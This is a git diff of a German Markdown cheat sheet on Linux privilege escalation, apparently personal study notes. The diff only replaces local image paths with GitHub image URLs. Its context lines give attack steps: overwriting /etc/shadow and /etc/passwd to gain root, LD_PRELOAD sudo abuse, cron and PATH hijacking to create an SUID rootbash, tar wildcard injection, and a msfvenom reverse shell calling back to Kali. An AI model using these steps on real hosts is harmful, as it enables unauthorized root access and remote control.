@@ -111,7 +111,7 @@ mysql -u root -h 127.0.0.1 -P 4444
 
 Wenn /etc/shadow **readable** ist, können Hashes ausgelesen werden und das root Passwort vllt. gecracked werden. Das Passwort befindet sich zwischen dem ersten und zweiten ":". $6$ zu Beginn gibt an, dass es sich um ein sha512 Hash handelt.
 
-![image-20200725200203020](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200725200203020.png)
+![image-20200725200203020](https://user-images.githubusercontent.com/33549572/88826132-a6c7d580-d1c8-11ea-9a97-3a5ff9b7a9ee.png)
 
 Der Hash kann in ein File gespeichert und mit john gecracked werden.
 
@@ -127,11 +127,11 @@ Wenn /etc/shadow **writable** ist, kann das root Passwort überschrieben werden.
 mkpasswd -m sha-512 newpassword
 ```
 
-![image-20200725200759527](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200725200759527.png)
+![image-20200725200759527](https://user-images.githubusercontent.com/33549572/88826200-bd6e2c80-d1c8-11ea-9496-5ca24dfb4176.png)
 
 Auf Kali in /etc/shadow das Passwort einfügen (erste Zeile ist root User)
 
-![](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200725200707381.png)
+![image-20200725200707381](https://user-images.githubusercontent.com/33549572/88826263-d1199300-d1c8-11ea-99e6-fac03fd1081b.png)
 
 Anschließend wieder **su** mit neuem Passwort (s.O.).
 
@@ -141,7 +141,7 @@ In /etc/passwd ist normalerweise kein Passwort mehr gesetzt, da mittlerweile /et
 
 Normalerweise sieht der Eintrag für root wie folgt aus (wobei x angibt, dass das Passwort in /etc/shadow enthalten ist):
 
-<img src="C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200725201410801.png" alt="image-20200725201410801" style="zoom: 50%;" />
+![image-20200725201410801](https://user-images.githubusercontent.com/33549572/88826305-df67af00-d1c8-11ea-9deb-2e0d72d6827d.png)
 
 In einigen Versionen von Linux kann das **x jedoch einfach entfernt werden**, wodurch root ein leeres Passwort besitzt.
 
@@ -160,7 +160,7 @@ Alternativ kann ein neuer root Benutzer mit folgendem Format hinzugefügt werden
 <username>:<passworthash>:0:0:root:/root:/bin/bash
 ```
 
-![image-20200725202002427](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200725202002427.png)
+![image-20200725202002427](https://user-images.githubusercontent.com/33549572/88826352-ec849e00-d1c8-11ea-859e-2a86e9eb0004.png)
 
 Anschließend mit **su newroot** und gesetztem Passwort einloggen.
 
@@ -228,13 +228,13 @@ sudo apache2 -f /etc/shadow
 #Wenn Cracken erfolgreich ist, einfach mit su auf root Shell wechseln
 ```
 
-![image-20200726122806287](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726122806287.png)
+![image-20200726122806287](https://user-images.githubusercontent.com/33549572/88826389-fc03e700-d1c8-11ea-8c51-1bc14965fa99.png)
 
 #### Environment Variables
 
 Wenn **LD_PRELOAD** gesetzt ist, kann u.U. eine root Shell gespawned werden. Hierfür muss z.B. **LD_PRELOAD für env_keep gesetzt sein**.
 
-![image-20200726123323688](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726123323688.png)
+![image-20200726123323688](https://user-images.githubusercontent.com/33549572/88826409-03c38b80-d1c9-11ea-94c9-94639dadcb22.png)
 
 Nun kann ein shared object File erzeugt werden, welches später geladen wird. Folgendes C Programm wird hierfür genutzt.
 
@@ -257,7 +257,7 @@ void _init() {
 sudo LD_PRELOAD=/tmp/preload.so find
 ```
 
-<img src="C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726123814082.png" alt="image-20200726123814082" style="zoom: 80%;" />
+![image-20200726123814082](https://user-images.githubusercontent.com/33549572/88826489-1b9b0f80-d1c9-11ea-971b-98ad4ea1ffbb.png)
 
 ------
 
@@ -286,8 +286,7 @@ void hijack() {
 #Kompilieren mit gcc -o libcrypt.so.1 -shared -fPIC library_path.c
 sudo LD_LIBRARY_PATH=. apache2
 ```
-
-<img src="C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726124542913.png" alt="image-20200726124542913" style="zoom: 67%;" />
+![image-20200726124542913](https://user-images.githubusercontent.com/33549572/88826540-29509500-d1c9-11ea-8de6-7eb92ced4e91.png)
 
 ## Cron Jobs
 
@@ -306,7 +305,7 @@ Cron Jobs laufen unter dem Security Level des Benutzer, welchem der Job gehört.
 
 Wenn ein Cron Jobs Scripts ausführt, welche ein Script laden und dieses Script beschreibbar ist, kann eigener Code ausgeführt würden. Dies kann u.U. zu PrivEsc führen. Der Prozess kann z.B. so aussehen:
 
-![image-20200726131253550](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726131253550.png)
+![image-20200726131253550](https://user-images.githubusercontent.com/33549572/88826582-340b2a00-d1c9-11ea-9b69-e7ba23c10fdf.png)
 
 **overwrite.sh** wird minütlich als root ausgeführt (durch * * * * * erkenntlich) und kann z.B. eine Reverse Shell zu Kali ausführen:
 
@@ -323,7 +322,7 @@ Auf Kali nun einen nc listener auf gewähltem Port starten und warten, bis Verbi
 
 In crontab Files ist eine PATH env Variable gesetzt, welche per Default auf /usr/bin:/bin gesetzt ist (diese kann vllt. überschrieben werden). Wenn ein Cronjob/Script **keinen** absoluten Pfad nutzt und eines der PATH Verzeichnisse schreibbar durch den aktuellen Benutzer ist, könnte dort ein Script (mit dem selben Namen wie im crontab) erstellt werden, welches ausgeführt wird. 
 
-![image-20200726133518644](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726133518644.png)
+![image-20200726133518644](https://user-images.githubusercontent.com/33549572/88826621-3ec5bf00-d1c9-11ea-890e-28b9bedbf767.png)
 
 Nun kann z.B. eine rootbash erstellt werden:
 
@@ -341,11 +340,11 @@ chmod +s /tmp/rootbash
 
 Befehle, welche Wildcards nutzen, können ausgetrickst werden, indem man Dateien erstellt und diese als commandline arguments benennt.
 
-![image-20200726134346644](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726134346644.png)
+![image-20200726134346644](https://user-images.githubusercontent.com/33549572/88826653-49805400-d1c9-11ea-9beb-73c7eb783b7b.png)
 
 Eine Suche auf https://gtfobins.github.io/ nach tar bietet eine Sequenz an, um eine Root Shell zu erzeugen:
 
-![image-20200726134500682](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726134500682.png)
+![image-20200726134500682](https://user-images.githubusercontent.com/33549572/88826691-5604ac80-d1c9-11ea-9bdb-3eda7d793d4d.png)
 
 Ins Verzeichnis nun eine Reverse Shell legen (mit msfvenom erzeugt):
 
@@ -355,7 +354,7 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI-IP LPORT=KALI-Port -f elf -o 
 
 Diese wird ins /home/user Verzeichnis kopiert. Anschließend Dateien erzeugen, welche tar als Argumente nutzen wird:
 
-![image-20200726134759086](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726134759086.png)
+![image-20200726134759086](https://user-images.githubusercontent.com/33549572/88826757-67e64f80-d1c9-11ea-9ab9-53fb9120c96d.png)
 
 ## SUID/SGID Files
 
@@ -383,7 +382,8 @@ strace <program> 2>&1 | grep -iE "open|access|no such file"
 
 Beispiel:
 
-<img src="C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726145804467.png" alt="image-20200726145804467" style="zoom:80%;" />
+<img src="https://user-images.githubusercontent.com/33549572/88826793-73d21180-d1c9-11ea-939a-ec8cc94e40df.png" alt="image-20200726145804467" style="zoom:80%;" />
+![image-20200726145804467](https://user-images.githubusercontent.com/33549572/88826793-73d21180-d1c9-11ea-939a-ec8cc94e40df.png)
 
 Das File libcalc.so befindet sich im beschreibbaren User Directory und kann durch eine eigene .so Datei ersetzt werden. Hierfür muss der exakte Pfad genutzt werden. Das .so File wird wie folgt erzeugt:
 
